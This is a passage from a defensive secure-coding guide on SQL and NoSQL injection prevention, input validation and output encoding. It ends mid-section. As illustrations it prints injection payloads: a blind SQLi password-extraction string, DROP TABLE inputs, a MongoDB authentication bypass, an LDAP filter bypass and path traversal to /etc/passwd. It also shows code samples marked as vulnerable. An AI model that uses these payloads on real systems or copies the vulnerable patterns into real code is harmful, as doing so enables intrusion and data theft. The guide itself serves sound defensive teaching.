Parameterization support varies by library quality. Verify driver documentation—some Node.js MySQL libraries perform client-side escaping instead of server-side parameterization.

### Parameterization Limitations and Workarounds

**Dynamic Table/Column Names:** Parameters only applicable to data values. Table names, column names, ORDER BY directions, and SQL keywords cannot be parameterized. Query `SELECT * FROM ? WHERE ? = ?` invalid—database requires literal identifiers during parsing phase.

**Whitelist Validation for Identifiers:** Maintain exhaustive list of permitted table/column names. Validate user input against whitelist before concatenation:

```python
ALLOWED_COLUMNS = {'username', 'email', 'created_at', 'status'}
ALLOWED_ORDERS = {'ASC', 'DESC'}

if sort_column not in ALLOWED_COLUMNS or sort_order not in ALLOWED_ORDERS:
    raise ValueError("Invalid sort parameters")
    
query = f"SELECT * FROM users ORDER BY {sort_column} {sort_order}"
```

Reject any input not explicitly permitted. Never attempt blacklist filtering—attackers bypass blacklists through encoding, obfuscation, or discovering unlisted attack vectors.

**Identifier Quoting:** Database-specific quoting mechanisms isolate identifiers. PostgreSQL uses double quotes, MySQL uses backticks, SQL Server uses brackets. Example: `SELECT * FROM "user_table" WHERE "column_name" = ?`. Does not prevent injection—attacker input containing quote characters still manipulates query structure. Quoting provides defense-in-depth but cannot replace whitelist validation.

**Dynamic IN Clauses:** Query with variable-length lists (`WHERE id IN (?, ?, ?)`) requires placeholder count matching list length. Generate parameterized query dynamically:

```python
ids = [1, 5, 7, 12]
placeholders = ','.join(['%s'] * len(ids))
query = f"SELECT * FROM users WHERE id IN ({placeholders})"
cursor.execute(query, ids)
```

Some ORMs provide array parameter support—PostgreSQL `= ANY(?)` with array binding, avoiding placeholder generation.

### ORM Security Considerations

Object-Relational Mappers abstract SQL generation but do not eliminate injection vulnerabilities. ORMs generate parameterized queries for standard operations (CRUD) but expose injection risks through advanced features.

**Raw SQL Methods:** ORMs provide escape hatches for complex queries:

```python
# Django ORM - VULNERABLE
User.objects.raw(f"SELECT * FROM users WHERE status = '{status}'")

# Django ORM - SECURE
User.objects.raw("SELECT * FROM users WHERE status = %s", [status])
```

Raw SQL methods accept parameterization but permit concatenation—developer discipline required.

**String-Based Filters:** Query builder methods accepting string expressions may interpret SQL operators:

```python
# SQLAlchemy - potentially dangerous
session.query(User).filter(f"username = '{username}'")  # String SQL

# SQLAlchemy - safe
session.query(User).filter(User.username == username)  # Expression API
```

Prefer expression-based APIs over string filters. String-based filters appropriate only with whitelist-validated identifiers.

**Order By Injection:** ORM methods accepting string-based sort parameters vulnerable to injection:

```python
# Django ORM
User.objects.all().order_by(sort_param)  # If sort_param from user input
```

Attacker provides `status'; DROP TABLE users;--` as `sort_param`. Mitigation: whitelist validation before passing to ORM.

**Extra/Annotate SQL:** Features allowing custom SQL expressions (aggregate functions, database-specific operators) introduce injection if incorporating user input:

```python
# Django - VULNERABLE
User.objects.extra(where=[f"status = '{user_status}'"])

# Django - SECURE  
User.objects.extra(where=["status = %s"], params=[user_status])
```

### Stored Procedures and Injection

Stored procedures do not inherently prevent injection. Security depends on implementation—parameterized calls to stored procedures remain secure, but stored procedures using dynamic SQL internally reintroduce vulnerability.

**Secure Stored Procedure Usage:**

```sql
-- Stored procedure definition (SQL Server)
CREATE PROCEDURE GetUserByEmail
    @Email NVARCHAR(255)
AS
BEGIN
    SELECT * FROM Users WHERE Email = @Email
END

-- Application code (C#)
SqlCommand cmd = new SqlCommand("GetUserByEmail", conn);
cmd.CommandType = CommandType.StoredProcedure;
cmd.Parameters.AddWithValue("@Email", userEmail);
```

Parameters passed to stored procedure treated as data, not executable code.

**Vulnerable Stored Procedure:**

```sql
CREATE PROCEDURE SearchUsers
    @SearchTerm NVARCHAR(255)
AS
BEGIN
    DECLARE @SQL NVARCHAR(MAX)
    SET @SQL = 'SELECT * FROM Users WHERE Username LIKE ''%' + @SearchTerm + '%'''
    EXEC sp_executesql @SQL
END
```

Stored procedure concatenates parameter into dynamic SQL. Injection possible through `@SearchTerm` despite parameterized call from application. Stored procedures using `EXEC()`, `sp_executesql` with concatenation inherit injection vulnerability.

**Dynamic SQL in Stored Procedures:** When required, use parameterized `sp_executesql`:

```sql
CREATE PROCEDURE SearchUsers
    @SearchTerm NVARCHAR(255)
AS
BEGIN
    DECLARE @SQL NVARCHAR(MAX)
    DECLARE @ParamDefinition NVARCHAR(255)
    
    SET @SQL = 'SELECT * FROM Users WHERE Username LIKE @Search'
    SET @ParamDefinition = '@Search NVARCHAR(255)'
    
    EXEC sp_executesql @SQL, @ParamDefinition, @Search = @SearchTerm
END
```

`sp_executesql` accepts parameter definitions and values separately, maintaining parameterization within dynamic SQL.

### Second-Order SQL Injection

Malicious payload stored in database, later incorporated into SQL query without sanitization. Attack unfolds in two stages:

1. Attacker submits payload through properly parameterized insert: `INSERT INTO users (username) VALUES (?)` with value `admin'--`
2. Application retrieves stored value, concatenates into subsequent query: `SELECT * FROM logs WHERE username = '` + username + `'` becomes `SELECT * FROM logs WHERE username = 'admin'--'`

**Prevention:** Treat all data from database as potentially malicious. Parameterize queries using stored data identically to external input. Never assume database content safe because it underwent prior validation—validation may be incomplete, or data modified through alternative channels (database admin, migration scripts, compromised application).

### Encoding and Escaping Approaches

**[Inference] Manual escaping theoretically possible but practically unreliable.** Database-specific escape functions exist (`mysqli_real_escape_string()`, `pg_escape_string()`). Escaping fraught with edge cases—character encoding mismatches, database-specific syntax variations, escaping function bugs. Single error permits injection.

**Context-Specific Encoding Issues:** Application using UTF-8, database using Latin-1. Multi-byte UTF-8 characters may encode to single-byte Latin-1 equivalents matching SQL metacharacters. Example: UTF-8 character `0xC2 0x27` (Unicode U+0027 encoded in certain contexts) becomes single quote `0x27` after encoding conversion, bypassing escape sequences.

**Best Practice:** Never rely on manual escaping. Use parameterized queries exclusively. Escaping appropriate only for contexts where parameterization impossible (legacy codebases, specific edge cases) and only with extreme caution, comprehensive testing, and security audit. Escaping functions serve as defense-in-depth but cannot serve as primary protection.

### Input Validation Strategies

**Whitelist Over Blacklist:** Define permitted character sets, formats, lengths. Reject inputs failing validation before database interaction. Email validation accepts alphanumerics, `@`, `.`, `-`, `_`. Product ID accepts integers only. Whitelist validation reduces attack surface but cannot replace parameterization—validation may contain gaps, business requirements change, novel attack vectors emerge.

**Type Enforcement:** Language type systems prevent certain injection vectors. Strongly-typed parameters (`int`, `DateTime`, `UUID`) restrict input to valid type instances. Attacker cannot inject SQL through integer parameter—type coercion fails before query construction. Type enforcement ineffective for string parameters—all SQL injection payloads valid strings.

**Length Limits:** Database column constraints (VARCHAR(50)) truncate excessive input. Application-level length validation must match or exceed strictness of database constraints. Truncation at database layer may result in unexpected behavior but typically does not introduce injection—truncated syntax becomes invalid SQL rather than dangerous SQL.

**Format Validation:** Regular expressions validate expected formats (email, phone, UUID). Regex validation provides early detection of malformed input but does not guarantee safety—valid format may contain injection payload. Email `admin@example.com'; DROP TABLE users; --@example.com` matches many regex patterns but contains injection. Validation complements parameterization; does not replace it.

### Blind SQL Injection Detection and Prevention

Time-based blind injection exploits slow application responses to confirm vulnerabilities and extract data. Attacker injects delay commands, measures response time.

**Attack Pattern:**

```
username: admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
```

Five-second response confirms first password character is 'a'. Attacker iterates through character set, extracting password bit-by-bit. Hundreds of requests extract full password.

**Detection Countermeasures:**

**Query Timeout Enforcement:** Database-level timeout terminates long-running queries. MySQL `max_execution_time`, PostgreSQL `statement_timeout`, SQL Server `QUERY_TIMEOUT`. Prevents indefinite delays but does not prevent information leakage through timeout/no-timeout binary signal.

**Response Time Normalization:** Add artificial delay to all responses, eliminating timing side-channel. 500ms fixed delay makes 5ms vs. 5000ms query time indistinguishable. Degrades user experience—inappropriate for most applications. Applicable to high-security administrative interfaces.

**Rate Limiting:** Limit requests per user per time window (10 requests/second, 1000 requests/hour). Blind injection requires hundreds of requests for data extraction—rate limiting makes attacks impractical. Legitimate use cases may require similar request volumes (data imports, bulk operations)—rate limiting requires tuning for specific application patterns.

**Primary Defense:** Parameterized queries eliminate blind injection at root cause. Attacker cannot inject delay commands if all input treated as data values.

### Least Privilege and Defense in Depth

**Database User Permissions:** Application database user should possess minimum necessary privileges. Read-only operations use read-only database account. Write operations use account with INSERT/UPDATE but not DROP/ALTER. Segregate privileges by application tier—web tier cannot execute administrative commands.

**Impact Limitation:** Successful injection attack constrained by database user permissions. Read-only account limits attacker to data exfiltration, prevents data modification or schema destruction. Does not prevent attack but reduces blast radius.

**Separate Accounts by Function:** User authentication database account differs from product catalog account differs from order processing account. Compromise of one account does not grant access to all data. Requires application architecture supporting multiple database connections with context-appropriate credentials.

**Read Replica Isolation:** Read-only queries execute against read replica with genuinely read-only permissions at database server level. Master database accepts only authenticated write operations from application server. Network segmentation prevents web tier from connecting to master database.

### Framework-Specific Protections

**Web Application Firewalls (WAF):** Inspect HTTP requests for SQL injection patterns. Signature-based detection (match against known payload patterns) and anomaly detection (statistical deviation from normal traffic). High false positive rate—legitimate queries containing SQL keywords (`SELECT * FROM menu WHERE name LIKE '%SELECT%'`) trigger alerts. WAF serves as monitoring and alerting layer, not primary defense. Attackers bypass WAFs through encoding, obfuscation, and zero-day payloads.

**Content Security Policy (CSP):** Browser-side protection against XSS, not directly applicable to SQL injection. Indirect benefit: CSP preventing XSS reduces attacker's ability to exfiltrate SQL injection results through client-side JavaScript.

**Database Activity Monitoring (DAM):** Logs all database queries with originating user, application, timestamp. Anomaly detection identifies unusual query patterns (excessive failed queries, queries to sensitive tables, off-hours access). Post-breach forensics tool rather than preventative control. Real-time alerts enable rapid incident response but do not stop injection.

### NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Cassandra) immune to SQL syntax injection but vulnerable to query manipulation through same root cause—untrusted input incorporated into queries.

**MongoDB Injection Example:**

```javascript
// VULNERABLE
db.users.find({ username: req.body.username, password: req.body.password });

// Attack payload (JSON)
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

Query becomes `find({ username: {$ne: null}, password: {$ne: null} })`, matching all documents with non-null username and password—authentication bypass.

**NoSQL Injection Prevention:**

**Type Validation:** Ensure input matches expected type. Username expects string; reject objects, arrays. Libraries like `validator.js`, `joi` enforce schema.

**Parameterized Queries (NoSQL Context):** Use query builders preventing operator injection:

```javascript
db.users.find({
  username: String(req.body.username),
  password: String(req.body.password)
});
```

Explicit type casting converts objects to strings, preventing operator injection.

**Operator Sanitization:** Strip MongoDB operators from user input:

```javascript
function sanitize(obj) {
  if (obj instanceof Object) {
    for (let key in obj) {
      if (/^\$/.test(key)) {
        delete obj[key];
      } else {
        sanitize(obj[key]);
      }
    }
  }
  return obj;
}
```

Removes keys beginning with `$`, preventing operator injection. Whitelist validation preferred over sanitization—explicitly define permitted keys rather than filtering dangerous ones.

### Testing and Validation

**Automated Scanning:** SQLMap, Burp Suite, OWASP ZAP detect SQL injection through automated payload injection and response analysis. Tools identify low-hanging fruit but miss complex injection points (second-order, blind injection through obscure parameters). Require manual configuration for authenticated endpoints, complex workflows.

**Manual Penetration Testing:** Security professionals manually test injection points using database-specific payloads, context-aware attacks, business logic understanding. Identifies vulnerabilities missed by automated tools but expensive and time-consuming. Recommended frequency: quarterly for high-risk applications, annually minimum.

**Static Code Analysis:** SAST tools (Checkmarx, Veracode, SonarQube) scan source code for parameterization violations, string concatenation in SQL queries. High false positive rate—flagging secure code, missing sophisticated vulnerabilities. Require tuning for specific codebase patterns. Integrate into CI/CD pipeline for continuous monitoring.

**Unit Testing Parameterization:** Test framework validates all database queries use parameterization. Intercept database driver calls, verify parameters passed separately from query string:

```python
def test_user_query_uses_parameterization():
    with patch('cursor.execute') as mock_execute:
        get_user_by_id(user_id=5)
        mock_execute.assert_called_once()
        args = mock_execute.call_args
        assert len(args[0]) == 2  # Query string and parameters separate
        assert '5' not in args[0][0]  # User input not in query string
```

### Legacy Code Remediation

**Incremental Refactoring:** Gradual conversion from concatenated queries to parameterized queries. Prioritize high-risk endpoints (authentication, payment processing, administrative functions). Lower-risk read-only queries addressed in subsequent phases. Complete remediation may require months for large codebases.

**Query Wrapper Functions:** Centralize database access through wrapper functions enforcing parameterization:

```python
def execute_query(query_template, params):
    if '%' in query_template or '+' in query_template:
        raise SecurityError("Query template contains concatenation")
    return cursor.execute(query_template, params)
```

Wrapper enforces parameterization at single point, preventing future concatenation. Existing code gradually migrated to wrapper.

**Backwards Compatibility Constraints:** Legacy systems may use database libraries lacking parameterization support. Options: upgrade library (risk of breaking changes), implement custom parameterization layer (wrapper around raw SQL execution), replace database access layer entirely (major refactoring). Cost-benefit analysis required—security improvement versus development effort and regression risk.

### Compliance and Regulatory Requirements

**PCI DSS Requirement 6.5.1:** Applications handling credit card data must protect against SQL injection. Annual ASV (Approved Scanning Vendor) scans detect injection vulnerabilities. Quarterly remediation required for identified issues. Non-compliance results in fines, loss of payment processing privileges.

**OWASP Top 10:** SQL injection consistently ranks in top 3 critical web application vulnerabilities. Organizations following OWASP guidelines must implement injection prevention as baseline security control. Security audits verify compliance.

**GDPR Data Protection:** SQL injection leading to personal data breach triggers GDPR notification requirements (72 hours to supervisory authority). Failure to implement appropriate technical measures (parameterized queries) demonstrates negligence, increasing fine severity (up to 4% global revenue).

### Related Topics

Prepared statement performance optimization, Database connection pooling and security, ORM query generation and security analysis, Input validation and sanitization strategies, Blind SQL injection detection techniques, Database access control and privilege management, Web Application Firewall (WAF) configuration, NoSQL injection prevention, Static Application Security Testing (SAST) for injection vulnerabilities, Secure coding training and awareness, Parameterized query testing frameworks, Second-order injection detection

---

## Input Validation Patterns

Input validation enforces constraints on untrusted data before processing, preventing injection attacks, data corruption, business logic violations, and system instability. Validation must occur at trust boundaries—wherever data transitions from untrusted to trusted contexts—with defense-in-depth applying multiple validation layers across architectural tiers.

### Validation Placement Strategy

**Client-Side Validation** Provides immediate user feedback reducing round-trip latency and server load. Never rely on client-side validation for security—attackers bypass JavaScript validation through browser DevTools, API clients, or request interception. Treat client validation as UX enhancement only. Duplicate all validation rules server-side.

**API Gateway/Edge Validation** Reject malformed requests before reaching application logic, protecting backend services from malicious traffic. Implement rate limiting, request size limits, content-type verification, and basic schema validation at edge layer. Trade-off: limited business context at gateway layer constrains validation depth to structural/syntactic checks.

**Application Layer Validation** Enforce business rules, cross-field dependencies, and domain-specific constraints. Access to full application context enables complex validation like uniqueness checks, referential integrity, state machine transitions. Validation failures should return specific error messages for legitimate users while avoiding information disclosure to attackers (don't reveal system internals, valid usernames, or internal state).

**Database Constraint Validation** Final defense layer using CHECK constraints, foreign keys, NOT NULL, unique indexes. Database constraints prevent corruption from application bugs, concurrent race conditions, or administrative errors. Never treat database constraints as primary validation—constraint violations throw exceptions disrupting user experience and complicating error handling.

### Validation Types

**Allowlist (Whitelist) Validation** Define acceptable input patterns explicitly; reject everything else. Strongly preferred over denylists. Examples: enum validation for status fields (`PENDING|APPROVED|REJECTED`), alphanumeric-only usernames (`^[a-zA-Z0-9_]{3,20}$`), country codes from ISO 3166 list. Allowlists scale poorly for complex inputs (rich text, code snippets) where legitimate input space is vast.

**Denylist (Blacklist) Validation** Block known malicious patterns. Inherently incomplete—attackers discover encoding bypasses, alternative attack vectors, or novel payloads not in denylist. Only use denylists as supplementary protection alongside allowlists. Example anti-pattern: blocking SQL keywords (`SELECT`, `DROP`) fails against encoded variants (`SEL%45CT`), Unicode homoglyphs, or case variations.

**Semantic Validation** Verify data satisfies business rules beyond format correctness. Examples: start date precedes end date, withdrawal amount doesn't exceed account balance, appointment slots don't overlap, user has required permissions for requested resource. Requires domain knowledge and often database queries for contextual verification.

**Type Coercion Validation** Strictly validate type compatibility before coercion. Programming languages with implicit type conversion (JavaScript, PHP, Python) enable type confusion attacks. Explicitly check `typeof`, `isinstance()`, or type annotations before processing. Reject inputs requiring unsafe coercion (string to integer overflow, float precision loss, null/undefined in arithmetic).

### Anti-Patterns

**Validation After Use** Validating input after already processing, storing, or displaying it. SQL injection example: concatenating user input into query string before validating for SQL metacharacters. Correct pattern: validate immediately upon receiving untrusted input, before any processing logic executes.

**Inconsistent Validation** Different validation rules across API endpoints handling same data type. Creates bypass opportunities where attacker submits malicious input through weakly validated endpoint, then accesses it through another service. Centralize validation logic in reusable validators/schemas shared across entire application.

**Error Message Information Disclosure** Detailed validation errors revealing system internals, valid usernames, or business logic. Bad: "User 'admin' exists but password incorrect." Good: "Invalid credentials." Balance: provide sufficient detail for legitimate users to correct input without aiding attackers in reconnaissance. Use error codes in responses, log full details server-side.

**Double Decoding Vulnerabilities** Validating input, then decoding again before use. Attacker submits double-encoded payload bypassing validation. Example: URL validation accepts `%253Cscript%253E` (double-encoded `<script>`), decoder runs twice producing executable script tag. Normalize/canonicalize input once before validation, never after.

**Regex Denial of Service (ReDoS)** Complex regex patterns with nested quantifiers exhibit exponential backtracking on malicious input. Example vulnerable pattern: `^(a+)+$` against input `aaaaaaaaaaaaaaaaaaaaaaaX`. Mitigation: avoid nested quantifiers, set regex timeout limits, use atomic grouping, prefer deterministic finite automata over backtracking engines.

**Client-Supplied Validation Bypass** Accepting client-specified validation rules or configurations. Example: API accepting regex pattern as parameter to validate other parameters. Attacker supplies permissive pattern (`.*`) bypassing all validation. Never trust client to define validation constraints.

**Length Validation After Encoding** Validating length on original input before encoding. Example: checking username is 20 characters, then HTML-encoding for display where `<` becomes `&lt;` (4 characters), causing buffer overflows or truncation. Validate lengths after all encoding/transformation operations.

### Injection Attack Prevention

**SQL Injection** Use parameterized queries (prepared statements) exclusively. Never concatenate user input into SQL strings. ORM frameworks provide parameterization by default but remain vulnerable if using raw query APIs incorrectly. Additional defense: principle of least privilege database accounts, stored procedures with limited permissions, input length restrictions.

**NoSQL Injection** MongoDB, Elasticsearch vulnerable to object injection when directly embedding user input. Example: `db.users.find({ username: req.body.username })` allows `{"$gt": ""}` bypass. Mitigation: strict type checking, use driver APIs enforcing operators (MongoDB's `$eq` operator), validate object structure before passing to database layer.

**Command Injection** Never pass unsanitized input to `exec()`, `system()`, `Runtime.exec()`, shell backticks. If shell execution unavoidable: use language-specific APIs with argument arrays preventing shell metacharacter interpretation (`subprocess` with `shell=False`, `ProcessBuilder`, `child_process.execFile`), validate input against strict allowlist, run processes with minimal privileges.

**LDAP Injection** Escape special characters (`*`, `(`, `)`, `\`, `/`, `NUL`) in LDAP filter strings. Use parameterized LDAP queries where available. Validate distinguished names (DN) against expected structure. Example vulnerable filter: `(&(uid={$username})(password={$password}))` where `username=*)(uid=*))(|(uid=*` bypasses authentication.

**XML Injection (XXE)** Disable external entity resolution in XML parsers. Configure `XMLInputFactory.SUPPORT_DTD=false`, `SAXParserFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. Validate XML against schema (XSD) rejecting unexpected elements. Avoid parsing untrusted XML when possible—prefer JSON for API data exchange.

**Template Injection** Never embed user input directly into template expressions. Server-side template injection (SSTI) enables remote code execution in Jinja2, FreeMarker, Velocity. Use auto-escaping template engines, pass user data as context variables only, never allow user-controlled template strings. Client-side frameworks (React, Vue, Angular) provide automatic XSS protection but remain vulnerable with `dangerouslySetInnerHTML` or `v-html`.

### Data Type Specific Validation

**Email Addresses** Validate format using RFC 5322 compliant regex or dedicated libraries (email-validator, Apache Commons Validator). Length limit: local part ≤64 characters, domain ≤255 characters, total ≤320 characters. Normalize by lowercasing domain portion only (local part may be case-sensitive per RFC). Verify domain MX records exist for critical flows (account registration). Never rely on email validation alone for authentication—implement verification workflows.

**URLs** Parse using URL libraries preventing SSRF attacks. Validate scheme allowlist (`https` only for production, block `file://`, `data://`, `javascript://`). Check host isn't internal IP address, localhost, or cloud metadata endpoints (`169.254.169.254`). Implement URL length limits (≤2083 characters for IE compatibility). Validate domain against public suffix list for cookie security.

**File Uploads** Validate MIME type against allowlist but never trust client-supplied `Content-Type` header. Inspect file magic bytes matching actual content type. Restrict file extensions allowlist. Enforce file size limits preventing DoS. Store uploaded files outside web root with randomized filenames preventing path traversal. Scan uploads with antivirus/antimalware before processing. For images: re-encode with trusted library stripping metadata, validate dimensions preventing decompression bombs.

**Phone Numbers** Parse using libphonenumber library providing international format validation. Store in E.164 format (`+[country][number]`) for consistency. Validate number is possible (correct length) and valid (assigned in numbering plan). Extract country code for regional validation rules. Handle extensions, vanity numbers, premium rate detection per business requirements.

**Dates and Times** Parse using ISO 8601 format (`YYYY-MM-DDTHH:mm:ss.sssZ`) avoiding ambiguous formats. Validate logical constraints (month ≤12, day valid for month/year considering leap years). Check dates fall within reasonable business range (birth dates >100 years ago suspect, future dates beyond business planning horizon). Store in UTC internally, convert to user timezone only for display. Validate timezone identifiers against IANA database.

**Monetary Values** Use fixed-point decimal types (BigDecimal, Decimal) never floating-point. Validate against business constraints (minimum order amount, withdrawal limits, max precision). Check for negative values where inappropriate. Validate currency codes against ISO 4217. Implement rounding mode explicitly (banker's rounding for financial calculations). Prevent integer overflow in currency conversions.

**IP Addresses** Parse using standard libraries (Java `InetAddress`, Python `ipaddress`). Distinguish IPv4 vs IPv6 requiring different validation rules. Reject private ranges, loopback, multicast, reserved blocks for user-supplied IPs in public-facing systems. Validate CIDR notation for network configurations. Handle IPv4-mapped IPv6 addresses (`::ffff:192.0.2.1`) canonicalizing to IPv4.

### Boundary and Range Validation

**Numeric Ranges** Validate minimum/maximum bounds preventing overflow, underflow, divide-by-zero. Consider type limits (32-bit signed integer: -2,147,483,648 to 2,147,483,647). Validate step/increment values. Check for NaN, Infinity in float operations. Implement saturation arithmetic or explicit overflow detection rather than silent wraparound.

**String Length** Enforce maximum length preventing buffer overflows, database column truncation, UI rendering issues. Set minimum length where appropriate (passwords ≥12 characters, usernames ≥3 characters). Count length correctly: Unicode code points vs bytes vs grapheme clusters differ. Database length limits typically measure bytes; character length varies by encoding (UTF-8 variable width 1-4 bytes).

**Array/Collection Size** Limit collection sizes preventing memory exhaustion DoS. Validate array element count before allocation. Implement pagination for unbounded datasets. Check for empty collections where business logic requires non-empty. Validate collection elements individually—one invalid element may require rejecting entire collection vs. filtering invalid entries depending on context.

**File Size** Enforce upload size limits at multiple layers: web server config, reverse proxy, application logic. Consider cumulative size limits per user/session. Validate compressed archive extracted size before decompression (zip bombs expand 42KB to 4.5PB). Monitor disk space consumption rate detecting DoS attempts.

### Canonicalization and Normalization

**Unicode Normalization** Normalize to NFC (Canonical Decomposition followed by Canonical Composition) or NFKC (Compatibility Decomposition) before validation. Prevents bypasses using different Unicode representations of same character. Example: `é` as single character U+00E9 vs. composed `e` (U+0065) + combining acute accent (U+0301). Comparison operations on non-normalized strings fail unpredictably.

**Path Normalization** Resolve `.`, `..`, symbolic links, URL encoding before validating file paths. Prevent directory traversal attacks (`../../../../etc/passwd`). Use absolute paths, validate resolved path remains within expected directory tree. Check path after normalization doesn't access sensitive locations (`/proc`, `/sys`, Windows registry paths).

**Case Normalization** Normalize case before comparison where case-insensitivity expected (email addresses, usernames in most systems). Document case-sensitivity policy explicitly. Consider locale-specific case conversion rules (Turkish İ/i dotted I problem). Database collations affect case-sensitive matching—ensure application and database case handling aligns.

### Contextual Output Encoding

Validation prevents malicious data entering system; encoding prevents malicious data executing when leaving system. Required even with perfect input validation as data composition can create injection vulnerabilities.

**HTML Context** Encode `<`, `>`, `&`, `"`, `'` to HTML entities. Use context-aware encoding: HTML body different from attribute values different from JavaScript string literals. Template engines provide auto-escaping but developers must understand context boundaries.

**JavaScript Context** JSON.stringify() for embedding data in JavaScript. Escape `</script>`, Unicode line separators (U+2028, U+2029). Never embed untrusted data in JavaScript execution contexts (`onclick`, `eval`, `setTimeout` string arguments).

**SQL Context** Use parameterized queries. If dynamic SQL unavoidable (column names, table names not parameterizable), validate against strict allowlist of known identifiers, apply database-specific identifier quoting.

**URL Context** URL-encode parameters using `encodeURIComponent()`. Validate protocol allowlist preventing `javascript:`, `data:` schemes. Encode complete URLs as href attributes preventing attribute injection (`" onload=alert(1) x="`).

### Validation Libraries and Frameworks

**JSON Schema** Define structural validation for JSON payloads. Supports type checking, required fields, pattern matching, numeric ranges, nested object validation. Limited semantic validation capabilities. Use draft versions consistently across services. Generate code from schemas for type-safe languages.

**XML Schema (XSD)** Comprehensive XML validation including type constraints, element cardinality, choice groups, complex type inheritance. Higher complexity than JSON Schema. Security considerations: disable entity resolution, set recursion limits, validate schema itself from trusted sources only.

**Bean Validation (JSR 380)** Java annotation-based validation (`@NotNull`, `@Size`, `@Pattern`, `@Email`). Supports custom validators, group validation, constraint composition. Integrates with Spring, Jakarta EE. Define validation groups for different contexts (creation vs. update operations).

**Pydantic** Python type-hint-based validation with runtime checking. Automatic data parsing, coercion, serialization. Custom validators via decorators. Generates JSON Schema from models. Performance overhead from validation suitable for API boundaries but not tight loops.

**Joi / Yup** JavaScript schema validation libraries. Fluent API for complex validation logic. Supports async validation, conditional schemas, custom error messages. Client and server-side usage. Bundle size considerations for frontend applications.

### Performance Considerations

**Validation Caching** Cache compiled regex patterns, parsed schemas, validator instances. Avoid recompiling validation rules per request. Use lazy initialization with thread-safe singleton patterns for validation infrastructure.

**Fail-Fast Validation** Return first validation error rather than collecting all errors when validating untrusted external input. Reduces processing time on obviously malicious payloads. Collect all errors for user-facing forms improving UX.

**Async Validation** Offload expensive validation (database uniqueness checks, external API calls) to async operations. Return provisional acceptance with eventual consistency. Implement compensating transactions for validation failures discovered post-acceptance.

**Validation Complexity Budget** Set computational limits on validation operations. Timeout complex regex matching. Limit recursion depth in nested structure validation. Implement circuit breakers on external validation services (fraud detection APIs, email verification services).

### Testing Validation Logic

**Boundary Value Testing** Test minimum valid, maximum valid, just below minimum, just above maximum, empty/null values. Example: password length 8-64 characters requires tests at 7, 8, 64, 65 characters.

**Equivalence Partitioning** Group inputs into equivalence classes expecting identical validation behavior. Test one value from each partition plus boundary cases. Reduces test case combinatorial explosion.

**Negative Testing** Deliberately supply invalid input expecting rejection. Test special characters, excessively long strings, wrong types, malformed formats, injection payloads. Fuzzing tools generate malformed inputs automatically.

**Property-Based Testing** Generate random valid and invalid inputs algorithmically, verify validation behaves correctly across entire input space. Libraries: QuickCheck, Hypothesis, fast-check. Discovers edge cases manual testing misses.

### Observability

Monitor validation metrics:

- Validation failure rate segmented by field/rule
- Most frequent validation errors
- Validation latency percentiles
- Suspiciously high failure rates from specific IPs (attack indicators)
- Validation bypass attempts (malformed encoding, injection payloads)

Alert on anomalies: sudden validation failure spikes (API contract changes, client bugs), unusual error distributions (targeted attacks), validation performance degradation.

**Related Topics**: Output encoding strategies, Cross-Site Scripting (XSS) prevention, Content Security Policy (CSP), parameterized queries and prepared statements, deserialization vulnerabilities, schema evolution and versioning, OWASP Top 10 injection defenses.

---

## Output Encoding

Output encoding transforms data into a safe representation for the target context, preventing injection attacks by ensuring special characters are interpreted as data rather than executable code. Context-specific encoding is mandatory—universal encoding does not exist.

### Context-Specific Encoding Requirements

**Critical principle:** The required encoding depends entirely on where data is inserted. Encoding for HTML context differs fundamentally from JavaScript, URL, CSS, or SQL contexts.

```python
from html import escape as html_escape
from urllib.parse import quote as url_encode
import json

# WRONG: Single encoding function for all contexts
def unsafe_encode(data):
    return html_escape(data)  # Only safe for HTML body text

# CORRECT: Context-specific encoding
def encode_for_html_body(data):
    """HTML body text context: <p>USER_DATA</p>"""
    return html_escape(data, quote=True)  # Escapes &, <, >, ", '

def encode_for_html_attribute(data):
    """HTML attribute context: <div title="USER_DATA">"""
    # Must also handle attribute-breaking characters
    return html_escape(data, quote=True)

def encode_for_javascript_string(data):
    """JavaScript string context: var x = "USER_DATA";"""
    # JSON encoding handles quotes, backslashes, control characters
    return json.dumps(data)[1:-1]  # Strip outer quotes

def encode_for_url_parameter(data):
    """URL parameter context: ?param=USER_DATA"""
    return url_encode(data, safe='')

def encode_for_css_string(data):
    """CSS string context: content: "USER_DATA";"""
    # Escape backslashes and quotes, encode non-ASCII
    encoded = data.replace('\\', '\\\\').replace('"', '\\"')
    return ''.join(
        c if ord(c) < 128 else f'\\{ord(c):x} '
        for c in encoded
    )
```

**Anti-pattern:** Applying HTML encoding to data inserted into JavaScript context. HTML encoding does not protect against JavaScript injection.

### HTML Context Encoding

#### HTML Body Text Context

```python
def encode_html_body(data):
    """
    Context: <p>USER_DATA</p> or <div>USER_DATA</div>
    Encodes: & < > " '
    """
    if data is None:
        return ''
    
    return (str(data)
        .replace('&', '&amp;')   # Must be first
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&#x27;'))  # More compatible than &apos;
```

**Edge case:** Null bytes (`\x00`) can truncate output in some parsers. Strip or replace null bytes before encoding.

#### HTML Attribute Context

```python
def encode_html_attribute(data):
    """
    Context: <div title="USER_DATA"> or <input value="USER_DATA">
    Must always use quoted attributes (never unquoted)
    """
    if data is None:
        return ''
    
    # Same encoding as HTML body, but enforce quoted attributes
    encoded = (str(data)
        .replace('&', '&amp;')
        .replace('<', '&lt;')
        .replace('>', '&gt;')
        .replace('"', '&quot;')
        .replace("'", '&#x27;'))
    
    # Additional: encode newlines that could break attribute parsing
    encoded = encoded.replace('\n', '&#10;').replace('\r', '&#13;')
    
    return encoded
```

**Anti-pattern:** Using unquoted attributes: `<div id=USER_DATA>`. Allows space characters to break attribute boundary. Always use quoted attributes.

**Critical:** Never insert user data directly into event handler attributes (`onclick`, `onerror`, etc.). These are JavaScript contexts requiring JavaScript encoding, but content security policy violations make this approach fundamentally unsafe.

#### Dangerous HTML Contexts

```python
# NEVER insert user data into these contexts, even with encoding:

# 1. Script block content
# BAD: <script>var data = "ENCODED_USER_DATA";</script>
# Use data attributes and read from DOM instead

# 2. Style block content  
# BAD: <style>.class { color: ENCODED_USER_DATA; }</style>
# CSS parsing complexity makes safe encoding nearly impossible

# 3. HTML comments
# BAD: <!-- ENCODED_USER_DATA -->
# Comment breaking sequences like "-->" cannot be safely encoded

# 4. Tag names or attribute names
